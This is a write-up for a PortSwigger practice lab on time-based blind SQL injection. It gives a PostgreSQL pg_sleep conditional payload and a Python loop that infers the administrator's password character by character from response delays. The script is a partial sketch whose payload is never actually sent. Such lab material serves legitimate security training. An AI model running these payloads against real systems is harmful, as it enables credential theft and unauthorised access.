# Lab: Blind SQL injection with time delays and information retrieval (Practitioner)

**PortSwigger:** [Official lab](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)

**Description:** Infer the administrator's password from conditional response delays and use it to log in.

**Goal:** Extract the administrator password using time-based blind SQLi.

## Technique

Combine time delay with conditional logic:

```
'; SELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

## Extraction Example (PostgreSQL)

```python
import requests
import time
import string

lab = "https://YOUR-LAB-ID.web-security-academy.net"
# set cookies...

password = ""
for pos in range(1, 21):
    for char in string.ascii_lowercase + string.digits:
        payload = f"'; SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}') THEN pg_sleep(5) ELSE pg_sleep(0) END--"
        # set TrackingId = original + payload
        start = time.time()
        requests.get(lab, cookies=cookies)
        if time.time() - start > 4:
            password += char
            print(password)
            break
```

Adjust sleep time and database syntax as needed.
